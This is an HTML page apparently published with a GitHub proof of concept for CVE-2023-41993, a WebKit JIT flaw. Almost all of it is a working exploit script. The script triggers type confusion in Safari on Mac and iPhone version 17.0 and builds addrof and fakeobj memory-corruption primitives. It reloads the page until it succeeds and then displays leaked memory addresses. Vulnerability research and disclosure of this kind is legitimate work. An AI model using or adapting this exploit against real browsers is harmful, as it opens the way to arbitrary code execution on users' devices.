
<!DOCTYPE html>
<html>
<body>
<a href="https://github.com/po6ix/POC-for-CVE-2023-41993" target="_blank">github</a>
<br>
<p>agent: <span id="agent">waiting</span></p>
<p>factor: <span id="factor">waiting</span></p>
<p>status: <span id="success">waiting</span></p>
<p>result: <span id="addr">waiting</span></p>
<p>unknown_device?: <span id="unknown_device">waiting</span></p><p>'failed to get getterSetter' == keep waiting! ~100 refreshes to success or invalid device</p>
<a href="https://github.com/po6ix/POC-for-CVE-2023-41993#known-affected-versions" target="_blank">list of affected webkit versions</a><br>
<a href="https://github.com/po6ix/POC-for-CVE-2023-41993#known-unaffected-version" target="_blank">list of unaffected webkit versions</a>
<style>
    p {
        font-weight: bold;
    } span {
        font-weight: normal;
    }
</style>
<script src="./util.js"></script>
<script src="./int64.js"></script>
<script>
document.getElementById("agent").textContent = navigator.userAgent;
/*
author: @po6ix
commit: https://github.com/WebKit/WebKit/commit/08d5d17c766ffc7ca6a7c833c5720eb71b427784
advisory: https://support.apple.com/en-us/HT213926
*/
let boxed_arr = new Function();
boxed_arr.p1 = 1.1;
boxed_arr[0] = {};

let getter = new Function();
getter.p1 = 1.1;
getter[0] = 1.1;

let shape = {};
for (let i = 0; i < 14; ++i) {
    shape['p'+i] = i;
}

let shapes = [];
for (let i = 0; i < 100; ++i) {
    shapes.push({
        ...shape,
        ['z'+i]: 0x1337
    });
}

function trigger(type) {
    let object_a = {};
    object_a.foo = 1;
    object_a.p1 = 1.1;

    let object_b = {};
    object_b.__defineGetter__('p1', getter);
    object_b.foo = 1;

    function get_getterSetter(type) {
        let o, retval;

        if (type == 0) o = object_a;
        else o = object_b;

        for (let i = 0; i < 2; ++i) {
            if (type == 0) retval = o.foo;
            else retval = o.foo;
        }
        return retval;
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    for (let i = 0; i < 1e6; ++i) {
        get_getterSetter(i % 2);
    }
    return [getter, get_getterSetter(1)];
}

(function pwn() {
    let isMac = navigator.userAgent.indexOf('Macintosh;') !== -1;
    let isIphone = navigator.userAgent.indexOf('iPhone;') !== -1;
    let version;
    try {
        version = navigator.userAgent.split('Version/')[1].split(' ')[0];
    } catch(e) {
        version = "";
    }
    let factor;
    let unknown_device = false;
    if (isMac && version == '17.0') {
        factor = 840;
    } else if (isIphone && version == '17.0') {
        factor = 87;
    } else {
        factor = 87 + Math.floor(Math.random() * 1000);
        unknown_device = true;
    }
    document.getElementById("factor").textContent = factor;
    if (unknown_device == true) {
        document.getElementById("unknown_device").textContent = "Device may be unsupported. Still attempting....";
    } else {
        document.getElementById("unknown_device").textContent = "Device may be supported. attempting....";
    }
    let [getter, getterSetter] = trigger();
    let success = false;
    try {
        getterSetter.toString();
    } catch(e) {
        // it should fail to call toString
        success = true;
    }
    if (!success) {
        console.log('failed to get getterSetter');
        document.getElementById("success").textContent = "failed to get getterSetter";
        location.reload();
        return;
    }

    let symbolObject = Object(getterSetter);

    let ref_arr = [];
    for (let i = 0; i < factor; ++i) {
        ref_arr.push(symbolObject.description);
    }

    getter.p13 = 1.1; // change the length of boxed_arr
    let unboxed_arr = getter;
    
    function addrof(o) {
        boxed_arr[8] = o;
        return Int64.fromDouble(unboxed_arr[0]);
    }

    function fakeobj(addr) {
        unboxed_arr[0] = addr.asDouble();
        return boxed_arr[8];
    }
    
    let sample = BigInt(addrof({}).toString());
    if (sample >= 0x200000000 || sample < 0x100000000) {
        alert('failed');
        document.getElementById("success").textContent = "failed";
        location.reload();
        return;
    } else {
        alert(`success!!!`);
        document.getElementById("success").textContent = "success!!!";
        if (unknown_device) {
            alert(`you seems to have found vallid factor for an untested device!\nif you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isIphone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`);
            document.getElementById("unknown_device").textContent = `you seems to have found vallid factor for an untested device!\nif you send this information to me, it could be helpful to others.\nisMac: ${isMac}, isIphone: ${isIphone}, version: ${version}, factor: ${factor}, userAgent: ${navigator.userAgent}`;
        }
    }

    alert(addrof({}).toString());
    alert(addrof({}).toString());
    alert(addrof({}).toString());
    alert(addrof({}).toString());
    document.getElementById("addr").textContent = addrof({}).toString();
})();

</script>
</body>
</html>
